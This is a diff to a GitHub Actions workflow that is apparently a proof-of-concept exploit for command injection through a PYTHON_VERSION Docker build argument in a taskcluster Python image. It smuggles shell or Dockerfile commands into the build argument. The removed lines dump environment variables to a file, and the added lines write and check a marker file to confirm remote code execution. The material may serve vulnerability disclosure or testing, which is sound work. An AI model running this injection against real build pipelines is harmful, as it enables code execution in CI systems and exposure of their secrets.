@@ -1,17 +1,23 @@
-name: Exploit PYTHON_VERSION
+name: RCE via PYTHON_VERSION
 on: push
 
 jobs:
-  hack:
+  exploit:
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v2
+      - name: Checkout code
+        uses: actions/checkout@v2
 
-      - name: Trigger RCE via PYTHON_VERSION
+      - name: Trigger RCE in Docker build
         run: |
-          # Use a valid base image but inject code into a RUN command
-          MALICIOUS_ARG="3.11-alpine && echo 'HACKED: ' && id && env > /env"
+          # Create a malicious PYTHON_VERSION with command injection
+          MALICIOUS_ARG="3.11-alpine; RUN echo 'RCE SUCCESS' > /RCE_MARKER"
+
+          # Build the image using the vulnerable Dockerfile
           docker build \
-            --build-arg PYTHON_VERSION="$MALICIOUS_ARG" \
-            -t hacked \
+            --build-arg PYTHON_VERSION="${MALICIOUS_ARG}" \
+            -t hacked-image \
             ./taskcluster/docker/python
+
+          # Confirm if the command ran by checking the marker file
+          docker run --rm hacked-image cat /RCE_MARKER || echo "No RCE"
